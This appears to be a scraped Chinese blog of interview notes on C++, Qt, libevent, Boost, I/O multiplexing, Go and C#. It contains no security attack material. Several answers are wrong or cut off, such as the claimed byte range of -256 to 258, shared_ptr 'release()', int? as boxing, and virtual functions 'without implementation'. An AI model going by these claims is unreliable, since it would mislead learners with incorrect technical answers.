函数从堆上动态分配内存。（自由存储区不等于堆）堆是c语言和操作系统的术语，是操作系统维护的一块内存。自由存储是C++中通过new和delete动态分配和释放对象的抽象概念。\n什么是多态？1）派生类对象的地址可以赋值给基类指针。对于通过基类指针调用基类和派生类中都有的同名、同参数表的虚函数的语句，编译时并不确定要执行的是基类还是派生类的虚函数；而当程序运行到该语句时，如果基类指针指向的是一个基类对象，则基类的虚函数被调用，如果基类指针指向的是一个派生类对象，则派生类的虚函数被调用。这种机制就叫作“多态（polymorphism）”。\n2）静态多态（编译阶段，地址早绑定）\n函数重载：包括普通函数的重载和成员函数的重载函数模板的使用：通过将类型作为参数，传递给模板，可使编译器生成该类型的函数。3）动态多态（运行阶段，地址晚绑定）在程序执行期间(非编译期)判断所引用对象的实际类型，根据其实际类型调用相应的方法。\n派生类\n虚函数\n继承和多态区别与联系？区别：继承是子类使用父类的方法，而多态则是父类使用子类的方法。\n1） 什么是继承，继承的特点？子类继承父类的特征和行为，使得子类具有父类的各种属性和方法。\n2） 什么是多态？相同的事物，调用其相同的方法，参数也相同时，但表现的行为却不同。\n3）继承是为了重用代码，有效实现代码重用，减少重复代码的出现。\n4）多态是为了接口重用，增强接口的扩展性。\n简述c、C++程序编译的内存分配情况从静态存储区域分配：内存在程序 编译 时 就已 经 分配 好，这块内 存在 程序 的整 个运行 期间 都存在 。速 度快、不容易出错 ， 因 为 有系 统 会善 后。例 如全 局变 量， sta tic 变量， 常量 字符 串等。在栈上分配：在执行函数时， 函数内局部变量的存储单元都在栈上创建，函数执行结束时这些存储单元自动被释放。 栈内存分配运算内置于处理器的指令集中， 效率很高， 但是 分配的内存容量有限 。大小为2M。从堆上分配：即动态内存分配。程序在运行的时候用 malloc 或 new 申请任意大小的内存，程序员自己负责在何时用 free 或delete 释放内存。动态内存的生存期由程序员决定，使用非常灵活。如果在堆上分配了空间，就有责任回收它，否则运行的程序会出现内存泄漏 ，另外频繁地分配和释放不同大小的堆空间将会产生堆内碎块 。\n虚函数可以内联吗？当呈现非多态的时候，虚函数可以内联。因为内敛函数是在编译的时候确定函数的执行位置的， 当函数呈现多态的时候，在编译的时候不知道是将基类的函数地址，还是派生类的地址写入虚函数表中，所以当非多态的时候就会将基类的虚函数地址直接写入虚函数表中，然后通过内联将代码地址写入。\n引用会占用内存空间吗？引用类型的变量会占用内存空间，占用的内存空间的大小和指针类型的大小是相同的。\nC++程序编译过程编译过程分为四个过程：编译（编译预处理、编译、优化），汇编，链接。\n编译预处理：处理以 # 开头的指令；\n编译、优化：将源码 .cpp 文件翻译成 .s 汇编代码；\n汇编：将汇编代码 .s 翻译成机器指令 .o 文件；\n链接：汇编程序生成的目标文件，即 .o 文件，并不会立即执行，因为可能会出现：.cpp 文件中的函数引用了另一个 .cpp 文件中定义的符号或者调用了某个库文件中的函数。那链接的目的就是将这些文件对应的目标文件连接成一个整体，从而生成可执行的程序 .exe 文件。\n链接分为两种：\n静态链接：代码从其所在的静态链接库中拷贝到最终的可执行程序中，在该程序被执行时，这些代码会被装入到该进程的虚拟地址空间中。动态链接：代码被放到动态链接库或共享对象的某个目标文件中，链接程序只是在最终的可执行程序中记录了共享对象的名字等一些信息。在程序执行时，动态链接库的全部内容会被映射到运行时相应进行的虚拟地址的空间。[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-5QrtRK4a-1649036213702)(C:\\Users\\ZHAOCHENHAO\\Pictures\\Camera Roll\\image-20220308221305914.png)]二者的优缺点：\n静态链接：浪费空间，每个可执行程序都会有目标文件的一个副本，这样如果目标文件进行了更新操作，就需要重新进行编译链接生成可执行程序（更新困难）；优点就是执行的时候运行速度快，因为可执行程序具备了程序运行的所有内容。\n动态链接：节省内存、更新方便，但是动态链接是在程序运行时，每次执行都需要链接，相比静态链接会有一定的性能损失。\n内存管理C++ 内存分区：栈、堆、全局&#x2F;静态存储区、常量存储区、代码区。\n栈：存放函数的局部变量、函数参数、返回地址等，由编译器自动分配和释放。\n堆：动态申请的内存空间，就是由 malloc 分配的内存块，由程序员控制它的分配和释放，如果程序执行结束还没有释放，操作系统会自动回收。\n全局区&#x2F;静态存储区（.bss 段和 .data 段）：存放全局变量和静态变量，程序运行结束操作系统自动释放，在 C 语言中，未初始化的放在 .bss 段中，初始化的放在 .data 段中，C++ 中不再区分了。\n常量存储区（.data 段）：存放的是常量，不允许修改，程序运行结束自动释放。\n代码区（.text 段）：存放代码，不允许修改，但可以执行。编译后的二进制文件存放在这里。\n栈和堆的区别申请方式：栈是系统自动分配，堆是程序员主动申请。\n申请后系统响应：分配栈空间，如果剩余空间大于申请空间则分配成功，否则分配失败栈溢出；申请堆空间，堆在内存中呈现的方式类似于链表（记录空闲地址空间的链表），在链表上寻找第一个大于申请空间的节点分配给程序，将该节点从链表中删除，大多数系统中该块空间的首地址存放的是本次分配空间的大小，便于释放，将该块空间上的剩余空间再次连接在空闲链表上。\n栈在内存中是连续的一块空间（向低地址扩展）最大容量是系统预定好的，堆在内存中的空间（向高地址扩展）是不连续的。\n申请效率：栈是有系统自动分配，申请效率高，但程序员无法控制；堆是由程序员主动申请，效率低，使用起来方便但是容易产生碎片。\n存放的内容：栈中存放的是局部变量，函数的参数；堆中存放的内容由程序员控制。\n智能指针有哪几种？智能指针的实现原理？智能指针是为了解决动态内存分配时带来的内存泄漏以及多次释放同一块内存空间而提出的。C++11 中封装在了  头文件中。\nC++11 中智能指针包括以下三种：\n共享指针（shared_ptr）：资源可以被多个指针共享，使用计数机制表明资源被几个指针共享。通过 use_count() 查看资源的所有者的个数，可以通过 unique_ptr、weak_ptr 来构造，调用 release() 释放资源的所有权，计数减一，当计数减为 0 时，会自动释放内存空间，从而避免了内存泄漏。独占指针（unique_ptr）：独享所有权的智能指针，资源只能被一个指针占有，该指针不能拷贝构造和赋值。但可以进行移动构造和移动赋值构造（调用 move() 函数），即一个 unique_ptr 对象赋值给另一个 unique_ptr 对象，可以通过该方法进行赋值。弱指针（weak_ptr）：指向 share_ptr 指向的对象，能够解决由shared_ptr带来的循环引用问题。\n一个 unique_ptr 怎么赋值给另一个 unique_ptr 对象？借助 std::move() 可以实现将一个 unique_ptr 对象赋值给另一个 unique_ptr 对象，其目的是实现所有权的转移。\nstd::unique_ptr&lt;A&gt; ptr1(new A());std::unique_ptr&lt;A&gt; ptr2 = std::move(ptr1);\n\nC++ 11 新特性auto 类型推导auto 关键字：自动类型推导，编译器会在 编译期间 通过初始值推导出变量的类型，通过 auto 定义的变量必须有初始值。\nauto 关键字基本的使用语法如下：\nauto var = val1 + val2; // 根据 val1 和 val2 相加的结果推断出 var 的类型，\n\n\n注意：编译器推导出来的类型和初始值的类型并不完全一样，编译器会适当地改变结果类型使其更符合初始化规则。\nlambda 表达式lambda 表达式，又被称为 lambda 函数或者 lambda 匿名函数。\nlambda匿名函数的定义:\n[capture list] (parameter list) -&gt; return type&#123;   function body;&#125;;\n\n其中：\ncapture list：捕获列表，指 lambda 所在函数中定义的局部变量的列表，通常为空。return type、parameter list、function body：分别表示返回值类型、参数列表、函数体，和普通函数一样。举例：\n#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std;int main()&#123;    int arr[4] = &#123;4, 2, 3, 1&#125;;    //对 a 数组中的元素进行升序排序    sort(arr, arr+4, [=](int x, int y) -&gt; bool&#123; return x &lt; y; &#125; );    for(int n : arr)&#123;        cout &lt;&lt; n &lt;&lt; &quot; &quot;;    &#125;    return 0;&#125;\n\n右值引用右值引用的出现是为了解决两个问题的,第一个问题是临时对象非必要的昂贵的拷贝操作，第二个问题是在模板函数中如何按照参数的实际类型进行转发。通过右值引用，很好的解决两个问题。\n右值引用考察的纪律还是挺高的，也挺重要的，看了很多关于右值引用的介绍，这篇文章是我看过右值引用最好的文章，必看：从四行代码看右值引用.\n引用，就是为了避免复制而存在，而左值引用和右值引用是为了不同的对象存在：\n左值引用的对象是变量右值引用的对象是常量\n#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main()&#123;    int var = 42;    int &amp;l_var = var;    int &amp;&amp;r_var = var; // error: cannot bind rvalue reference of type &#x27;int&amp;&amp;&#x27; to lvalue of type &#x27;int&#x27; 错误：不能将右值引用绑定到左值上    int &amp;&amp;r_var2 = var + 40; // 正确：将 r_var2 绑定到求和结果上    return 0;&#125;\n\n智能指针\nvolatile 的作用？是否具有原子性，对编译器有什么影响？volatile 的作用：当对象的值可能在程序的控制或检测之外被改变时，应该将该对象声明为 violatile，告知编译器不应对这样的对象进行优化。\nvolatile不具有原子性。\nvolatile 对编译器的影响：使用该关键字后，编译器不会对相应的对象进行优化，即不会将变量从内存缓存到寄存器中，防止多个线程有可能使用内存中的变量，有可能使用寄存器中的变量，从而导致程序错误。\nref：https://blog.csdn.net/Awesomewan/article/details/123948929\nQTQt信号和槽的本质是什么​    回调函数。信号或是传递值，或是传递动作变化；槽函数响应信号或是接收值，或者根据动作变化来做出对应操作。\n描述QT中的文件流(QTextStream)和数据流(QDataStream)的区别​       文件流(QTextStream)。操作轻量级数据（int,double,QString）数据写入文本件中以后以文本的方式呈现。\n数据流(QDataStream)。通过数据流可以操作各种数据类型，包括对象，存储到文件中数据为二进制。\n文件流，数据流都可以操作磁盘文件，也可以操作内存数据。通过流对象可以将对象打包到内存，进行数据的传输。\n\nref：https://blog.csdn.net/qq_35693630/article/details/122807833\nlibeventLibevent是一个轻量级的开源高性能网络库\nlibevent简介\n上来当然要先夸奖啦，Libevent 有几个显著的亮点：&#x3D;&gt; 事件驱动（event-driven），高性能;&#x3D;&gt; 轻量级，专注于网络，不如ACE那么臃肿庞大；&#x3D;&gt; 源代码相当精炼、易读；&#x3D;&gt; 跨平台，支持Windows、Linux、*BSD和Mac Os；&#x3D;&gt; 支持多种I&#x2F;O多路复用技术， epoll、poll、dev&#x2F;poll、select和kqueue等；&#x3D;&gt; 支持I&#x2F;O，定时器和信号等事件；&#x3D;&gt; 注册事件优先级；\nLibevent已经被广泛的应用，作为底层的网络库；比如memcached、Vomit、Nylon、Netchat等等。\n采用的是epoll 反应堆模型。\nboostBoost常用的库很多都已经被包含到C++11、C++14或者C++17中了。\n这里还是按照Boost程序库完全开发指针的目录结构进行总结。\n常用功能库：关于时间的 chrono库， 已被加入C++11标准。关于随机数的random库，已被加入C++11标准。关于正则表达式的regex库，已被加入C++11标准。\n内存管理：包括智能指针scoped_ptr, 对于C++11中的unique_ptr。shared_ptr， 已被加入C++11标准。weak_ptr，已被加入C++11标准。scoped_arrayshared_arrayscoped_array&#x2F;shared_array是scoped_ptr&#x2F;shared_ptr对动态数组的扩展，它们为动态数组提供了可自动删除的代理，shared_array比scoped_array有更多的用途，但我们应该使用vector和shared_ptr，除非程序对性能有非常苛刻的要求。\n使用工具：noncopyable，允许程序轻松实现一个禁止拷贝的类。它将拷贝构造函数和拷贝赋值函数设置为private，禁止进行拷贝和赋值。将默认构造函数设置为protected，禁止直接产出无意义的noncopyable对象。\nignore_unused，使用可变参数模板，可以支持任意数量、任意类型的变量，把它们作为函数的参数“使用”了一下，达到了与(void)var完全相同的效果。但它的命名更清晰，写法更简单，而且由于是inline函数，完全没有运行时的效率损失。\nuuid， 用来生成全局唯一的UUID。\n容器与数据结构：定长数组类array，已被加入C++11标准。散列容器(无序关联容器)unordered_set、unordered_mulitset、unordered_map、unordered_multimap，已被加入C++11标准。环形缓冲区circular_buffer。元组tuple，已被加入C++11标准。any，用来容纳任何类型的元素。 已被加入C++17标准。\n函数与回调：ref库，定义了一个很小很简单的引用类型的包装器，可以用来进行引用传递。 已被加入C++11标准。bind库，是对C++98标准中函数适配器bind1st&#x2F;bind2nd的泛化和增强，可以适配任意的可调用对象，包括函数指针，函数引用，成员函数指针和函数对象。已被加入到C++11标准。function是一个函数对象的“容器”，概念上像是C&#x2F;C++中函数指针类型的泛化，是一种“智能函数指针”。它以对象的形式封装了原始的函数指针或函数对象，能够容纳任意符合函数签名的可调用对象。因此可以被用于回调机制，暂时保管函数或函数对象，在之后需要的时机再调用，使回调机制拥有更多的弹性。 已被加入到C++11标准。\n并发编程:atomic实现原子操作。它封装了不同计算机硬件的底层操作原语，提供了跨平台的原子操作功能，让我们完全摆脱并发编程读写变量的困扰。\nthread库实现了操作系统里的线程表示，赋值启动和管理线程对象。asio库基于前摄器模式封装了操作系统的select、kqueue、poll&#x2F;epoll、overlapped I&#x2F;O 等机制，实现了异步IO模型。ref：https://blog.csdn.net/xp178171640/article/details/105405950\nC空结构体多少个字节？\n1字节，实例化的时候需要分配内存\n用const修饰一个函数有什么作用？\n防止修改成员变量\nIO多路复用概念IO多路复用是指内核一旦发现进程指定的一个或者多个IO条件准备读取，它就通知该进程。其实就是在单个线程中通过记录跟踪每一个I&#x2F;O流的状态来管理多个I&#x2F;O流。\nselectselect基于fd_set结构体（一个long类型数组），数组内的每一个元素都与一个fd相关联。select是基于遍历来查找fd事件的，所以时间复杂度为O(n)。\nselect在监听过程中，每次需要把fd列表从用户态拷贝到内核态，然后再遍历所有fd，判断有无读写事件发生。这也导致select在监听IO数量较多的情况下，性能开销极大（poll也有这个缺点）\n为了减少数据拷贝带来的性能损坏，所以内核对单个进程可监视的fd数量做了限制。\n水平触发：如果用户程序没有处理select所报告的fd，则下一次select时会继续报告此fd。\npollpoll与select的机制基本一致。由于poll是基于链表存储fd关联的，所以poll没有最大连接数限制。poll也是基于遍历来查找fd事件的，时间复杂度也是O(n)。\n水平触发：如果用户程序没有处理poll所报告的fd，则下一次poll时会继续报告此fd。\npoll的缺点：\n和select一样，每次都把全部fd拷贝进内核态，再从中遍历查找有新事件的fd，性能开销大。\nepollepoll底层是基于哈希表和回调函数的，所以时间复杂度为O(1)。\nepoll有两种模式，LT和ET，LT是默认的模式，\nET是高速模式（边缘触发）。\nLT模式（水平触发）：epoll_wait检测到某fd事件就绪并通知用户程序时，如果用户程序不处理该事件，则每次epoll_wait都会返回这个fd事件，不断提醒用户程序去操作。\nET模式（边缘触发）：当一个fd里有新的数据变化时，epoll只会向用户程序返回一次报告，直到下次再有新的数据流入之后，才会再次返回报告，无论fd中是否还有数据可读。\nepoll的优点：\n不会像select或poll那样因为打开的fd过多而影响性能。没有最大并发限制连接xiao限制。epoll在监听到fd变化后不必像select或poll那样返回整个fd列表来进行遍历查找，而是只将产生变化的fd（即活跃的fd）放入一个列表中，调用callback函数返回。使用了mmap技术，利用mmap()文件映射内存加速与内核空间的消息传递。epoll存在的问题：\n当活跃连接数过多时可能会有性能问题。epoll机制需要很多回调函数，在连接数较少的情况下，性能可能不如select和poll。\nref: https://blog.csdn.net/weixin_45743893/article/details/122970342\nGogo的调度答：\ngo的调度原理是基于GMP模型，G代表一个goroutine，不限制数量；M&#x3D;machine，代表一个线程，最大1万，所有G任务还是在M上执行；P&#x3D;processor代表一个处理器，每一个允许的M都会绑定一个G，默认与逻辑CPU数量相等（通过runtime.GOMAXPROCS(runtime.NumCPU())设置）。\ngo调用过程\n创建一个G对象\n如果还有空闲的的P，创建一个M\nM会启动一个底层线程，循环执行能找到的G\nG的执行顺序是先从本地队列找，本地没找到从全局队列找。一次性转移(全局G个数/P个数）个，再去其它P中找（一次性转移一半）\n以上的G任务是按照队列顺序执行（也就是go函数的调用顺序）。\n另外在启动时会有一个专门的sysmon来监控和管理，记录所有P的G任务计数schedtick。如果某个P的schedtick一直没有递增，说明这个P一直在执行一个G任务，如果超过一定时间就会为G增加标记，并且该G执行非内联函数时中断自己并把自己加到队尾。\n\ngo struct能不能比较可以能，也可以不能。\n因为go存在不能使用&#x3D;&#x3D;判断类型：map、slice，如果struct包含这些类型的字段，则不能比较。\n这两种类型也不能作为map的key。\n####go defer（for defer）\n答：\n类似栈操作，后进先出。\n因为go的return是一个非原子性操作，比如语句 return i，实际上分两步进行，即将i值存入栈中作为返回值，然后执行跳转，而defer的执行时机正是跳转前，所以说defer执行时还是有机会操作返回值的。\nselect可以用于什么答:\n\ngoroutine超时设置，防止goroutine一直执行导致内存不释放等问题。\n判断channel是否已满或空。如实现一个池线程，当channel已被写满，暂无空闲worker在进行读取，进入default，返回一个暂无可分配资源错误。\n\nselect的case的表达式必须是一个channel类型，所有case都会被求值，求值顺序自上而下，从左至右。如果多个case可以完成，则会随机执行一个case，如果有default分支，则执行default分支语句。如果连default都没有，则select语句会一直阻塞，直到至少有一个IO操作可以进行。\nbreak关键字可跳出select的执行。\ncontext包的用途goroutine管理、信息传递。context的意思是上下文，在线程、协程中都有这个概念，它指的是程序单元的一个运行状态、现场、快照，包含。context在多个goroutine中是并发安全的。\nref: https://blog.csdn.net/lxw1844912514/article/details/108519770\nC#C#中堆和栈的区别？栈：由编译器自动分配、释放。在函数体中定义的变量通常在栈上。 堆：一般由程序员分配释放。用 new、 malloc 等分配内存函数分配得到的就是在堆上。 存放在栈中时要管存储顺序，保持着先进后出的原则，他是一片连续的内存域，有系统自动分配和维护；堆：是无序的，他是一片不连续的内存域，有用户自己来控制和释放，如果用户自己不释放的话，当内存达到一定的特定值时，通过垃圾回收器(GC) 来回收。栈内存无需我们管理，也不受 GC 管理。当栈顶元素使用完毕，立马释放。而堆则需要 GC 清理。使用引用类型的时候，一般是对指针进行的操作而非引用类型对象本身。但是值类型则操作其本身\nC#中的委托是什么？事件是不是一种委托？委托的本质是一个类，委托是将一种方法作为参数代入到另一种方法。 事件是委托的实例，事件是一种 特殊的委托。 &#x2F;&#x2F; 比如： onclick 事件中的参数就是一种方法。\nC#静态构造函数特点是什么？最先被执行的构造函数，且在一个类里只允许有一个无参的静态构造函数执行顺序：静态变量 &gt; 静态构造函数 &gt; 实例变量 &gt; 实例构造函数\nCTS、CLS、CLR分别作何解释CTS ：通用语言系统。 CLS ：通用语言规范。 CLR ：公共语言运行库。CTS ： Common Type System 通用类型系统。 Int32 、 Int16 → int 、 String → string 、 Boolean → bool 。每种语言都定义了自己的类型， .NET 通过 CTS 提供了公共的类型，然后翻译生成对应的 .NET 类型。CLS ： Common Language Specification 通用语言规范。不同语言语法的不同。每种语言都有自己的语法，.NET 通过 CLS 提供了公共的语法，然后不同语言翻译生成对应的 .NET 语法。CLR ： Common Language Runtime 公共语言运行时，就是 GC 、 JIT 等这些。有不同的 CLR ，比如服务器CLR 、 Linux CLR （ Mono ）、 Silverlight CLR(CoreCLR) 。相当于一个发动机，负责执行 IL 。\nC#中什么是值类型与引用类型？值类型： struct 、 enum 、 int 、 float 、 char 、 bool 、 decimal引用类型： class 、 delegate 、 interface 、 array 、 object 、 string\n请详述在C#中类(class)与结构(struct)的异同？class 可以被实例化 , 属于引用类型 ,class 可以实现接口和单继承其他类 , 还可以作为基类型 , 是分配在内存的堆上的struct 属于值类型 , 不能作为基类型 , 但是可以实现接口 , 是分配在内存的栈上的 .\nnew关键字的作用运算符：创建对象实例修饰符：在派生类定义一个重名的方法，隐藏掉基类方法约束：泛型约束定义，约束可使用的泛型类型\nint?和int有什么区别int ？为可空类型，默认值可以是 nullint 默认值是 0int? 是通过 int 装箱为引用类型实现\nC#中值传递与引用传递的区别是什么？值传递时，系统首先为被调用方法的形参分配内存空间，并将实参的值按位置一一对应地复制给形参，此后，被调用方法中形参值得任何改变都不会影响到相应的实参；引用传递时，系统不是将实参本身的值复制后传递给形参，而是将其引用值（即地址值）传递给形参，因此，形参所引用的该地址上的变量与传递的实参相同，方法体内相应形参值得任何改变都将影响到作为引用传递的实参。简而言之，按值传递不是值参数是值类型，而是指形参变量会复制实参变量，也就是会在栈上多创建一个相同的变量。而按引用传递则不会。可以通过 ref 和 out 来决定参数是否按照引用传递。\n10.C#中参数传递 ref 与 out 的区别？（ 1 ） ref 指定的参数在函数调用时必须先初始化，而 out 不用（ 2 ） out 指定的参数在进入函数时会清空自己，因此必须在函数内部进行初始化赋值操作，而 ref 不用总结： ref 可以把值传到方法里，也可以把值传到方法外； out 只可以把值传到方法外注意： string 作为特殊的引用类型，其操作是与值类型看齐的，若要将方法内对形参赋值后的结果传递出来，需要加上ref 或 out 关键字。\nC#中什么是装箱和拆箱？装箱：把值类型转换成引用类型拆箱：把引用类型转换成值类型装箱：对值类型在堆中分配一个对象实例，并将该值复制到新的对象中。（ 1 ）第一步：新分配托管堆内存 ( 大小为值类型实例大小加上一个方法表指针。（ 2 ）第二步：将值类型的实例字段拷贝到新分配的内存中。（ 3 ）第三步：返回托管堆中新分配对象的地址。这个地址就是一个指向对象的引用了。拆箱：检查对象实例，确保它是给定值类型的一个装箱值。将该值从实例复制到值类型变量中。在装箱时是不需要显式的类型转换的，不过拆箱需要显式的类型转换。int i&#x3D;0;System.Object obj&#x3D;i; &#x2F;&#x2F; 这个过程就是装箱！就是将 i 装箱！int j&#x3D;(int)obj;&#x2F;&#x2F; 这个过程 obj 拆箱！\nC#实现多态的过程中 overload 重载 与override 重写的区别？override 重写与 overload 重载的区别。重载是方法的名称相同。参数或参数类型不同，进行多次重载以适应不同的需要override 是进行基类中函数的重写。实现多态。重载：是方法的名称相同，参数或参数类型不同；重载是面向过程的概念。重写：是对基类中的虚方法进行重写。重写是面向对象的概念。 13.C# 中 static 关键字的作用？对类有意义的字段和方法使用 static 关键字修饰，称为静态成员，通过类名加访问操作符 “.” 进行访问 ; 对类的实例有意义的字段和方法不加 static 关键字，称为非静态成员或实例成员。注 : 静态字段在内存中只有一个拷贝，非静态字段则是在每个实例对象中拥有一个拷贝。而方法无论是否为静态，在内存中只会有一份拷贝，区别只是通过类名来访问还是通过实例名来访问。\nC# 成员变量和成员函数前加static的作用？它们被称为常成员变量和常成员函数，又称为类成员变量和类成员函数。分别用来反映类的状态。比如类成员变量可以用来统计类实例的数量，类成员函数负责这种统计的动作。不用 new\nC#中索引器的实现过程，是否只能根据数字进行索引，请描述一 下C# 通过提供索引器，可以象处理数组一样处理对象。特别是属性，每一个元素都以一个 get 或 set 方法暴露。索引器不单能索引数字（数组下标），还能索引一些 HASHMAP 的字符串，所以，通常来说， C# 中类的索引器通常只有一个，就是 THIS ，但也可以有无数个，只要你的参数列表不同就可以了索引器和返回值无关 , 索引器最大的好处是使代码看上去更自然，更符合实际的思考模式。微软官方一个示例：索引器允许类或结构的实例按照与数组相同的方式进行索引。 索引器类似于属性，不同之处在于它们的访问器采用参数。 在下面的示例中，定义了一个泛型类（ class SampleCollection ），并为其提供了简单的 get 和 set 访问器 方法（作为分配和检索值的方法）。 Program 类为存储字符串创建了此类的一个实例。\nC#中 abstract class和interface有什么区别?abstract class abstract 声明抽象类抽象方法，一个类中有抽象方法，那么这个类就是抽象类了。所谓的 抽象方法，就是不含主体（不提供实现方法），必须由继承者重写。因此，抽象类不可实例化，只能通 过继承被子类重写。interface 声明接口，只提供一些方法规约，在 C#8 之前的版本中不提供任何实现，在 C#9 版本也可以支 持接口的实现；不能用public 、 abstract 等修饰，无字段、常量，无构造函数两者区别：1.interface 中不能有字段，而 abstract class 可以有 ; 2.interface 中不能有 public 等修饰符，而 abstractclass 可以有。 3.interface 可以实现多继承 。\nC#中用sealed修饰的类有什么特点？密封，不能继承。\n字符串中string str&#x3D;null和string str&#x3D;””和string str&#x3D;string.Empty的区别string.Empty 相当于 “”,Empty 是一个静态只读的字段。 string str&#x3D;”” , 初始化对象，并分配一个空字符串 的内存空间 string str&#x3D;null, 初始化对象，不会分配内存空间19.byte b &#x3D; ‘a’; byte c &#x3D; 1; byte d &#x3D; ‘ab’; byte e &#x3D; ‘啊’; byte g &#x3D; 256; 这些变量有些错误是错在哪里?本题考查的是数据类型能承载数据的大小。1byte &#x3D;8bit ， 1 个汉字 &#x3D;2 个 byte ， 1 个英文 &#x3D;1 个 byte&#x3D;8bit所以 bc 是对的， deg 是错的。 ‘a’ 是 char 类型， a 错误java byte 取值范围是 -128127, 而 C# 里一个 byte 是 0255\nstring和StringBuilder的区别,两者性能的比较都是引用类型，分配再堆上 StringBuilder默认容量是 16 ，可以允许扩充它所封装的字符串中字符的数量 . 每个 StringBuffer 对象都有 一定的缓冲区容量，当字符串大小没有超过容量时，不会分配新的容量，当字符串大小超过容量时，会 自动增加容量。对于简单的字符串连接操作，在性能上 stringbuilder 不一定总是优于 strin 因为 stringbulider 对象的创建 也消耗大量的性能，在字符串连接比较少的情况下，过度滥用stringbuilder 会导致性能的浪费而非节约，只有大量无法预知次数的字符串操作才考虑stringbuilder 的使用。从最后分析可以看出如果是相对 较少的字符串拼接根本看不出太大差别。Stringbulider 的使用，最好制定合适的容量值，否则优于默认值容量不足而频繁的进行内存分\n什么是扩展方法？一句话解释，扩展方法使你能够向现有类型 “ 添加 ” 方法，无需修改类型条件：按扩展方法必须满足的条件， 1. 必须要静态类中的静态方法 2. 第一个参数的类型是要扩展的类型，并且需要添加this 关键字以标识其为扩展方法建议：通常，只在不得已的情况下才实现扩展方法，并谨慎的实现使用：不能通过类名调用，直接使用类型来调用\n特性是什么？如何使用？特性与属性是完全不相同的两个概念，只是在名称上比较相近。 Attribute 特性就是关联了一个目标对象的一段配置信息，本质上是一个类，其为目标元素提供关联附加信息，这段附加信息存储在dll 内的元数据，它本身没什么意义。运行期以反射的方式来获取附加信息\n什么叫应用程序域(AppDomain)一种边界，它由公共语言运行库围绕同一应用程序范围内创建的对象建立（即，从应用程序入口点开始，沿着对象激活的序列的任何位置）。应用程序域有助于将在一个应用程序中创建的对象与在其他应用程序中创建的对象隔离，以使运行时行 为可以预知。在一个单独的进程中可以存在多个应用程序域。应用程序域可以理解为一种轻量级进程。起到安全的作用。占用资源小。\nbyte a &#x3D;255;a+&#x3D;5;a的值是多少？byte 的取值范围是 -2 的 8 次方至 2 的 8 次方 -1 ， -256 至 258 ， a+&#x3D;1 时， a 的值时 0 ， a+&#x3D;5 时， a 的值是 0 ，所 以a+&#x3D;5 时，值是 \nconst和readonly有什么区别？都可以标识一个常量。主要有以下区别：1 、初始化位置不同。 const 必须在声明的同时赋值； readonly 即可以在声明处赋值 ;2 、修饰对象不同。 const 即可以修饰类的字段，也可以修饰局部变量； readonly 只能修饰类的字段3 、 const 是编译时常量，在编译时确定该值； readonly 是运行时常量，在运行时确定该值。4 、 const 默认是静态的；而 readonly 如果设置成静态需要显示声明5 、修饰引用类型时不同， const 只能修饰 string 或值为 null 的其他引用类型； readonly 可以是任何类型。26.分析下面代码，a、b的值是多少？分析：一个字母、数字占一个 byte ，一个中文占占两个 byte ，所以 a&#x3D;8,b&#x3D;527.Strings &#x3D; new String(“xyz”);创建了几个String Object?两个对象，一个是 “xyz”, 一个是指向 “xyz” 的引用对象 s 。28.c#可否对内存直接操作C# 在 unsafe 模式下可以使用指针对内存进行操作 , 但在托管模式下不可以使用指针， C#NET 默认不运行带指针的，需要设置下，选择项目右键-&gt; 属性 -&gt; 选择生成 -&gt;“ 允许不安全代码 ” 打勾 -&gt; 保存29.什么是强类型，什么是弱类型？哪种更好些？为什么?强类型是在编译的时候就确定类型的数据，在执行时类型不能更改，而弱类型在执行的时候才会确定类 型。没有好不好，二者各有好处，强类型安全，因为它事先已经确定好了，而且效率高。一般用于编译 型编程语言，如c++,java,c#,pascal等 , 弱类型相比而言不安全，在运行的时候容易出现错误，但它灵活， 多用于解释型编程语言，如javascript 等30.Math.Round(11.5)等於多少? Math.Round(-11.5)等於多少?Math.Round(11.5)&#x3D;12Math.Round(-11.5)&#x3D;-1231.&amp;和&amp;&amp;的区别相同点 &amp;和 &amp;&amp; 都可作逻辑与的运算符，表示逻辑与（ and ），当运算符两边的表达式的结果都为 true 时，其结 果才为true ，否则，只要有一方为 false ，则结果为 false 。（ ps ：当要用到逻辑与的时候 &amp; 是毫无意义， &amp;本身就不是干这个的）string strTmp &#x3D; “a1某某某 “;int a &#x3D; System.Text.Encoding.Default.GetBytes(strTmp).Length;int b &#x3D; strTmp.Length; 不同点if(loginUser!&#x3D;null&amp;&amp;string.IsnullOrEmpty(loginUser.UserName))&amp;&amp; 具有短路的功能，即如果第一个表达式为 false ，则不再计算第二个表达式，对于上面的表达式，当loginUser为 null 时，后面的表达式不会执行，所以不会出现 NullPointerException 如果将 &amp;&amp; 改为 &amp; ，则 会抛出NullPointerException 异常。（ ps ：所以说当要用到逻辑与的时候 &amp; 是毫无意义的） &amp; 是用作位运算的。 总结 &amp;是位运算，返回结果是 int 类型 &amp;&amp; 是逻辑运算，返回结果是 bool 类型32.i++和++i有什么区别？1.i++ 是先赋值，然后再自增； ++i 是先自增，后赋值。2.i&#x3D;0 ， i++&#x3D;0 ， ++i&#x3D;1 ； Console.WriteLine(++i&#x3D;&#x3D;i++); 结果位 true\nas和is的区别as 在转换的同时判断兼容性，如果无法进行转换，返回位 null （没有产生新的对象）， as 转换是否成功判断的依据是是否位 null is 只是做类型兼容性判断，并不执行真正的类型转换，返回 true 或 false ，对象为 null 也会返回 false 。as 比 is 效率更高， as 只需要做一次类型兼容检查\n谈谈final、finally的区别。final ：不能作为父类被继承。一个类不能声明是 final ，又声明为 abstract 。finally ：用于 try{}catch{}finally{} 结构，用于异常处理时执行任何清除操作。\n简述C#成员修饰符abstract: 指示该方法或属性没有实现。const: 指定域或局部变量的值不能被改动。event: 声明一个事件。extern: 指示方法在外部实现。override: 对由基类继承成员的新实现。readonly: 指示一个域只能在声明时以及相同类的内部被赋值。static: 指示一个成员属于类型本身 , 而不是属于特定的对象。virtual: 指示一个方法或存取器的实现可以在继承类中被覆盖。\n什么是匿名类，有什么好处？不用定义、没有名字的类，使用一次便可丢弃。好处是简单、随意、临时的。\n什么是虚函数？什么是抽象函数？虚函数：没有实现的，可以由子类继承并重写的函数。抽象函数：规定其非虚子类必须实现的函数，必须被重写。\n什么是MVC模式MVC(Model View Controller) 模型－视图－控制器aspx 就是 View ，视图； Model ： DataSet 、 Reader 、对象； Controller ： cs 代码。MVC 